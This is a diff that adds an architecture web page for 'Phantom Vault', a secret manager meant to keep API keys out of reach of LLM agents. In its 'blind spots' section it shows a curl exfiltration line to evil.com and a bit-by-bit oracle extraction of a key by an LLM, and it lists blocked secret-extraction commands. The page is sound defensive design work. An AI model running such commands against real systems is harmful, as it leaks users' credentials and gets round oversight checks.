@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Architecture — Phantom Vault</title>
+  <style>
+    :root {
+      --bg: #0a0a0f;
+      --surface: #12121a;
+      --border: #1e1e2e;
+      --text: #cdd6f4;
+      --text-dim: #6c7086;
+      --accent: #e94560;
+      --green: #a6e3a1;
+      --blue: #89b4fa;
+      --yellow: #f9e2af;
+      --code-bg: #181825;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+    }
+    .nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: rgba(10, 10, 15, 0.95);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border);
+      padding: 16px 24px;
+      z-index: 100;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .nav a { color: var(--text-dim); text-decoration: none; font-size: 0.9rem; }
+    .nav a:hover { color: var(--accent); }
+    .nav .brand { color: var(--text); font-weight: 600; }
+    .nav .brand span { color: var(--accent); }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 100px 24px 80px;
+    }
+    h1 {
+      font-size: 2.5rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #fff;
+    }
+    h1 span { color: var(--accent); }
+    .subtitle {
+      color: var(--text-dim);
+      font-size: 1.1rem;
+      margin-bottom: 48px;
+      font-style: italic;
+    }
+    h2 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: #fff;
+      margin: 48px 0 16px;
+      padding-bottom: 8px;
+      border-bottom: 1px solid var(--border);
+    }
+    h3 {
+      font-size: 1.15rem;
+      font-weight: 600;
+      color: var(--blue);
+      margin: 32px 0 12px;
+    }
+    h4 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text);
+      margin: 24px 0 8px;
+    }
+    p { margin-bottom: 16px; }
+    strong { color: #fff; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .toc {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px 32px;
+      margin-bottom: 48px;
+    }
+    .toc h3 { margin: 0 0 16px; color: var(--text-dim); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.1em; }
+    .toc ul { list-style: none; columns: 2; column-gap: 32px; }
+    .toc li { margin-bottom: 8px; }
+    .toc a { color: var(--text); font-size: 0.95rem; }
+    .toc a:hover { color: var(--accent); }
+    @media (max-width: 600px) { .toc ul { columns: 1; } }
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 20px 24px;
+      margin: 16px 0 24px;
+      overflow-x: auto;
+      font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
+      font-size: 0.85rem;
+      line-height: 1.5;
+    }
+    code {
+      font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
+      font-size: 0.9em;
+    }
+    p code, li code {
+      background: var(--code-bg);
+      padding: 2px 8px;
+      border-radius: 4px;
+      color: var(--green);
+    }
+    .blind-spot {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      margin: 24px 0;
+    }
+    .blind-spot h4 {
+      color: var(--accent);
+      margin: 0 0 12px;
+      font-size: 1.05rem;
+    }
+    .blind-spot .problem { color: var(--yellow); margin-bottom: 8px; }
+    .blind-spot .why { color: var(--text-dim); font-style: italic; margin-bottom: 8px; }
+    .blind-spot .fix { color: var(--green); }
+    .callout {
+      background: var(--surface);
+      border-left: 3px solid var(--accent);
+      padding: 16px 20px;
+      margin: 24px 0;
+      border-radius: 0 8px 8px 0;
+    }
+    .callout.info { border-left-color: var(--blue); }
+    .callout p { margin: 0; }
+    ul, ol { margin: 16px 0; padding-left: 24px; }
+    li { margin-bottom: 8px; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 16px 0 24px;
+      font-size: 0.9rem;
+    }
+    th, td {
+      padding: 12px 16px;
+      text-align: left;
+      border: 1px solid var(--border);
+    }
+    th {
+      background: var(--surface);
+      color: var(--blue);
+      font-weight: 600;
+    }
+    td { background: var(--code-bg); }
+    hr { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
+    .arch-diagram {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 24px;
+      margin: 24px 0;
+      overflow-x: auto;
+      font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace;
+      font-size: 0.75rem;
+      line-height: 1.4;
+      color: var(--green);
+    }
+    .footer {
+      border-top: 1px solid var(--border);
+      padding-top: 24px;
+      margin-top: 64px;
+      color: var(--text-dim);
+      font-size: 0.85rem;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <nav class="nav">
+    <a href="/" class="brand">Phantom <span>Vault</span></a>
+    <div>
+      <a href="/manual.html" style="margin-right: 24px;">Manual</a>
+      <a href="/">Home</a>
+    </div>
+  </nav>
+
+  <div class="container">
+    <h1>System <span>Architecture</span></h1>
+    <p class="subtitle">Next-Generation LLM-Safe Secret Management</p>
+
+    <div class="toc">
+      <h3>Contents</h3>
+      <ul>
+        <li><a href="#blind-spots">1. The 14 Blind Spots</a></li>
+        <li><a href="#architecture">2. 5-Layer Architecture</a></li>
+        <li><a href="#tech-stack">3. Tech Stack</a></li>
+        <li><a href="#mcp-design">4. MCP Server Design</a></li>
+        <li><a href="#command-analysis">5. Command Pre-Analysis</a></li>
+        <li><a href="#roadmap">6. Release Roadmap</a></li>
+      </ul>
+    </div>
+
+    <h2 id="blind-spots">1. The 14 Blind Spots</h2>
+    <p>Existing secret managers have critical gaps that motivated attackers or clever LLMs can exploit. These are patterns humans miss because they think about secrets the way humans use them, not the way machines exploit them.</p>
+
+    <div class="blind-spot">
+      <h4>1. The Master Password Paradox</h4>
+      <p class="problem"><strong>Problem:</strong> Most vaults require a master password in a config file. A plaintext secret protecting all your other secrets.</p>
+      <p class="why"><strong>Why it's missed:</strong> We focus on vault encryption and forget the key is taped to the front door.</p>
+      <p class="fix"><strong>The fix:</strong> Eliminate the master password entirely. Use macOS Secure Enclave + Touch ID. The decryption key is hardware-bound and biometric-gated. No password exists anywhere in any file, ever.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>2. Exact-Match-Only Sanitization</h4>
+      <p class="problem"><strong>Problem:</strong> If your API key is <code>sk_live_abc123</code> and the output contains <code>c2tfbGl2ZV9hYmMxMjM=</code> (Base64), it passes through unredacted.</p>
+      <p class="why"><strong>Why it's missed:</strong> We think of secrets as fixed strings. Machines think of them as transformable data.</p>
+      <p class="fix"><strong>The fix:</strong> Multi-encoding sanitization. Generate every transformation: Base64, URL-encoded, hex, reversed, ROT13, HTML entities, JSON escaped. Scan for ALL variants.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>3. No Memory Protection</h4>
+      <p class="problem"><strong>Problem:</strong> Garbage collectors move memory around freely, potentially leaving copies. Memory can be swapped to disk. Core dumps capture everything.</p>
+      <p class="why"><strong>Why it's missed:</strong> We think "process memory is private."</p>
+      <p class="fix"><strong>The fix:</strong> Rust with <code>zeroize</code> crate for deterministic clearing. <code>mlock()</code> to prevent swap. <code>mprotect()</code> for no-read except during injection.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>4. The Subprocess Can Do Anything</h4>
+      <p class="problem"><strong>Problem:</strong> Nothing stops a subprocess from doing <code>curl https://evil.com?stolen=$API_KEY</code> while making a legitimate API call.</p>
+      <p class="why"><strong>Why it's missed:</strong> We trust the commands we write. We forget the LLM is choosing the commands.</p>
+      <p class="fix"><strong>The fix:</strong> Network egress filtering. Per-process firewall rules that only allow approved domains.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>5. No Canary Detection</h4>
+      <p class="problem"><strong>Problem:</strong> If an LLM probes for secrets via prompt injection, there's zero detection.</p>
+      <p class="why"><strong>Why it's missed:</strong> We build walls but no alarms.</p>
+      <p class="fix"><strong>The fix:</strong> Plant canary secrets that trigger immediate alerts when touched.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>6. The Differential Oracle Attack</h4>
+      <p class="problem"><strong>Problem:</strong> An LLM can extract secrets bit by bit: <code>if [ "${API_KEY:0:1}" = "s" ]; then echo YES; fi</code></p>
+      <p class="why"><strong>Why it's missed:</strong> We think of secrets as atomic. Machines think of them as testable sequences.</p>
+      <p class="fix"><strong>The fix:</strong> Command pre-analysis. Block substring extraction, conditional tests, character iteration patterns.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>7. No Short-Lived Secrets</h4>
+      <p class="problem"><strong>Problem:</strong> Static secrets created months ago are still valid if ever leaked.</p>
+      <p class="fix"><strong>The fix:</strong> Built-in rotation engine with vendor API integration for automatic key rotation.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>8. No Process Lineage Tracking</h4>
+      <p class="problem"><strong>Problem:</strong> Logs say "curl was run with STRIPE_KEY" but not "this originated from prompt injection."</p>
+      <p class="fix"><strong>The fix:</strong> Full request chain capture with trust level tagging: HUMAN_DIRECT, LLM_APPROVED, LLM_AUTO.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>9. Clipboard Exfiltration</h4>
+      <p class="problem"><strong>Problem:</strong> Every application can read the system clipboard silently.</p>
+      <p class="fix"><strong>The fix:</strong> Never use system clipboard for secrets. Use direct stdin piping or authenticated Unix sockets.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>10. Config File Attack Surface</h4>
+      <p class="problem"><strong>Problem:</strong> An attacker who modifies the config can redirect to a fake vault binary.</p>
+      <p class="fix"><strong>The fix:</strong> Signed configuration. Verify integrity using Secure Enclave. Refuse to start if tampered.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>11. Timing Analysis</h4>
+      <p class="problem"><strong>Problem:</strong> Response timing and packet sizes can leak information about secrets.</p>
+      <p class="fix"><strong>The fix:</strong> Constant-time output. Pad responses to fixed sizes. Add random jitter (50-200ms).</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>12. No Dependency Graph</h4>
+      <p class="problem"><strong>Problem:</strong> Secrets have relationships. If DATABASE_URL is compromised, which others are affected?</p>
+      <p class="fix"><strong>The fix:</strong> Model secret dependencies. One-click rotation of entire dependency chains.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>13. No Multi-Tenant Isolation</h4>
+      <p class="problem"><strong>Problem:</strong> Managing multiple clients means <code>secret_list</code> reveals all client key names.</p>
+      <p class="fix"><strong>The fix:</strong> Vault namespaces. Each client/project isolated. LLM doesn't know other namespaces exist.</p>
+    </div>
+
+    <div class="blind-spot">
+      <h4>14. No Dead Man's Switch</h4>
+      <p class="problem"><strong>Problem:</strong> If your laptop is stolen, all secrets are accessible once the thief brute-forces access.</p>
+      <p class="fix"><strong>The fix:</strong> Remote revocation. Device reports stolen triggers immediate vault wipe.</p>
+    </div>
+
+    <hr>
+
+    <h2 id="architecture">2. 5-Layer Architecture</h2>
+
+    <div class="arch-diagram"><pre>
++-------------------------------------------------------------------------+
+|  LAYER 0: HARDWARE ROOT OF TRUST                                        |
+|                                                                         |
+|  Apple Secure Enclave (M-series) / TPM 2.0 (Linux) / FIDO2 (YubiKey)   |
+|  Master key generated IN hardware, never extractable                    |
+|  Biometric gate: Touch ID / Face ID / YubiKey touch                    |
+|  No master password exists. Anywhere. Ever.                             |
++------------------------------------+------------------------------------+
+                                     |
+                                     v Hardware-backed decryption
++------------------------------------+------------------------------------+
+|  LAYER 1: ENCRYPTED VAULT (At Rest)                                     |
+|                                                                         |
+|  AES-256-GCM + XChaCha20-Poly1305 (dual encryption)                    |
+|  Argon2id key derivation (memory-hard)                                  |
+|  Rust: deterministic memory, no GC                                      |
+|  mlock() on all secret-holding pages                                    |
+|  zeroize on drop (compiler-guaranteed cleanup)                          |
+|  SQLite with WAL mode, 0600 permissions                                 |
++------------------------------------+------------------------------------+
+                                     |
+                                     v Scoped injection into sandbox
++------------------------------------+------------------------------------+
+|  LAYER 2: RUNTIME INJECTION (In Transit)                                |
+|                                                                         |
+|  Subprocess spawned in network-restricted sandbox                       |
+|  Per-process firewall: only approved domains reachable                  |
+|  Secrets injected via direct env, never via file                        |
+|  Command pre-analysis: block oracle patterns                            |
+|  Rate limiting per secret per time window                               |
++------------------------------------+------------------------------------+
+                                     |
+                                     v Multi-layer sanitization
++------------------------------------+------------------------------------+
+|  LAYER 3: OUTPUT SANITIZATION (At Return)                               |
+|                                                                         |
+|  Exact match + multi-encoding redaction (15+ formats)                   |
+|  Sliding-window substring match (8+ char windows)                       |
+|  Constant-time response padding (anti-timing oracle)                    |
+|  Canary trigger detection                                               |
++------------------------------------+------------------------------------+
+                                     |
+                                     v Tamper-evident logging
++------------------------------------+------------------------------------+
+|  LAYER 4: AUDIT & DETECTION                                             |
+|                                                                         |
+|  HMAC-chained append-only log                                           |
+|  Trust level tagging (HUMAN_DIRECT / LLM_APPROVED / LLM_AUTO)          |
+|  Anomaly detection (unusual patterns, rapid probing)                    |
+|  Canary alert system (webhook, email, Slack)                            |
+|  Dead man's switch (remote wipe capability)                             |
++-------------------------------------------------------------------------+</pre></div>
+
+    <hr>
+
+    <h2 id="tech-stack">3. Tech Stack</h2>
+
+    <h3>Why Rust?</h3>
+    <ul>
+      <li><strong>Deterministic memory management</strong> — no GC moving secrets around</li>
+      <li><strong><code>zeroize</code> crate</strong> — compiler-guaranteed memory clearing</li>
+      <li><strong><code>mlock()</code> actually works</strong> — memory doesn't get relocated</li>
+      <li><strong>Memory safety</strong> without runtime overhead</li>
+      <li><strong>Strong type system</strong> — SecretString type that cannot be printed, logged, or serialized</li>
+    </ul>
+
+    <h3>Core Dependencies</h3>
+    <table>
+      <tr><th>Crate</th><th>Purpose</th></tr>
+      <tr><td><code>ring</code> / <code>aes-gcm</code></td><td>AES-256-GCM encryption</td></tr>
+      <tr><td><code>chacha20poly1305</code></td><td>XChaCha20-Poly1305 (second layer)</td></tr>
+      <tr><td><code>argon2</code></td><td>Key derivation</td></tr>
+      <tr><td><code>zeroize</code></td><td>Deterministic memory clearing</td></tr>
+      <tr><td><code>secrecy</code></td><td>Secret-holding types</td></tr>
+      <tr><td><code>rusqlite</code></td><td>SQLite storage</td></tr>
+      <tr><td><code>security-framework</code></td><td>macOS Keychain / Secure Enclave</td></tr>
+      <tr><td><code>tokio</code></td><td>Async runtime for MCP server</td></tr>
+    </table>
+
+    <h3>Build Targets</h3>
+    <ul>
+      <li>macOS aarch64 (Apple Silicon with Secure Enclave)</li>
+      <li>macOS x86_64 (Intel, Keychain without Secure Enclave)</li>
+      <li>Linux x86_64 (TPM 2.0 or FIDO2)</li>
+      <li>Linux aarch64 (Raspberry Pi, cloud ARM)</li>
+    </ul>
+
+    <hr>
+
+    <h2 id="mcp-design">4. MCP Server Design</h2>
+
+    <h3>Tools Exposed to LLM</h3>
+    <table>
+      <tr><th>Tool</th><th>Returns</th><th>Secret Exposed?</th></tr>
+      <tr><td><code>vault_list</code></td><td>Key names + metadata</td><td>NEVER</td></tr>
+      <tr><td><code>vault_exists</code></td><td>Boolean</td><td>NEVER</td></tr>
+      <tr><td><code>vault_masked</code></td><td>Last 4 chars: <code>••••WXYZ</code></td><td>NEVER</td></tr>
+      <tr><td><code>vault_run</code></td><td>Sanitized command output</td><td>NEVER</td></tr>
+      <tr><td><code>vault_health</code></td><td>Expiration warnings, status</td><td>NEVER</td></tr>
+      <tr><td><code>vault_rotate</code></td><td>Pending human approval</td><td>NEVER</td></tr>
+    </table>
+
+    <h3>Tools That Do NOT Exist</h3>
+    <ul>
+      <li>No <code>vault_get</code> — raw plaintext retrieval</li>
+      <li>No <code>vault_export</code> — bulk extraction</li>
+      <li>No <code>vault_dump</code> — debugging tool</li>
+      <li>No <code>vault_decrypt</code> — direct decryption</li>
+    </ul>
+    <p><strong>You cannot call what does not exist.</strong></p>
+
+    <h3>Human-Only Operations</h3>
+    <p>These require biometric confirmation + direct TTY (not piped through MCP):</p>
+    <ul>
+      <li><code>phantom get KEY</code> — retrieve plaintext</li>
+      <li><code>phantom export</code> — bulk export</li>
+      <li><code>phantom backup</code> — create backup</li>
+      <li><code>phantom rotate --force</code> — forced rotation</li>
+    </ul>
+
+    <hr>
+
+    <h2 id="command-analysis">5. Command Pre-Analysis</h2>
+    <p>Before any <code>vault_run</code> executes, a static analyzer blocks oracle attacks.</p>
+
+    <h3>Blocked Patterns</h3>
+    <pre><span style="color: var(--yellow);">CATEGORY: Substring Extraction</span>
+  ${VAR:offset:length}     → BLOCKED (bash substring)
+  echo $VAR | cut -cN-M    → BLOCKED (character extraction)
+  echo $VAR | sed ...      → BLOCKED (positional replacement)
+  python -c "...VAR[N]"    → BLOCKED
+
+<span style="color: var(--yellow);">CATEGORY: Conditional Testing</span>
+  if [ "$VAR" = "..." ]    → BLOCKED (equality test)
+  [[ $VAR == *pattern* ]]  → BLOCKED (pattern match)
+  echo $VAR | grep ...     → BLOCKED (pattern search)
+
+<span style="color: var(--yellow);">CATEGORY: Encoding/Exfiltration</span>
+  echo $VAR | base64       → BLOCKED
+  echo $VAR | xxd          → BLOCKED
+  curl ...$VAR...          → BLOCKED (if VAR in URL)
+
+<span style="color: var(--yellow);">CATEGORY: Direct Access</span>
+  printenv VAR             → BLOCKED
+  echo $VAR                → BLOCKED
+  cat /proc/self/environ   → BLOCKED</pre>
+
+    <h3>Allowed Patterns</h3>
+    <pre><span style="color: var(--green);">CATEGORY: Normal Usage (secrets in env, not in args)</span>
+  curl -H "Authorization: Bearer $VAR" https://api.stripe.com → ALLOWED
+  psql $DATABASE_URL -c "SELECT ..."                          → ALLOWED
+  railway deploy                                               → ALLOWED
+  npm run build                                                → ALLOWED</pre>
+
+    <div class="callout info">
+      <p><strong>Key distinction:</strong> Secrets used AS environment variables by well-behaved programs are fine. Secrets used AS command arguments, piped through text processing, or tested conditionally are blocked.</p>
+    </div>
+
+    <hr>
+
+    <h2 id="roadmap">6. Release Roadmap</h2>
+    <table>
+      <tr><th>Version</th><th>Scope</th></tr>
+      <tr><td>0.1.0</td><td>Core crypto + memory protection + basic CLI</td></tr>
+      <tr><td>0.2.0</td><td>Multi-encoding sanitizer + command pre-analysis</td></tr>
+      <tr><td>0.3.0</td><td>MCP server (Claude Code integration)</td></tr>
+      <tr><td>0.4.0</td><td>Secure Enclave / FIDO2 integration</td></tr>
+      <tr><td>0.5.0</td><td>Namespace isolation + canary secrets</td></tr>
+      <tr><td>0.6.0</td><td>Process sandboxing + network filtering</td></tr>
+      <tr><td>0.7.0</td><td>Audit system + lineage tracking</td></tr>
+      <tr><td>0.8.0</td><td>Secret rotation engine</td></tr>
+      <tr><td>0.9.0</td><td>Security audit + penetration testing</td></tr>
+      <tr><td>1.0.0</td><td>Production release</td></tr>
+    </table>
+
+    <div class="footer">
+      <a href="/">← Back to Home</a>
+    </div>
+  </div>
+</body>
+</html>
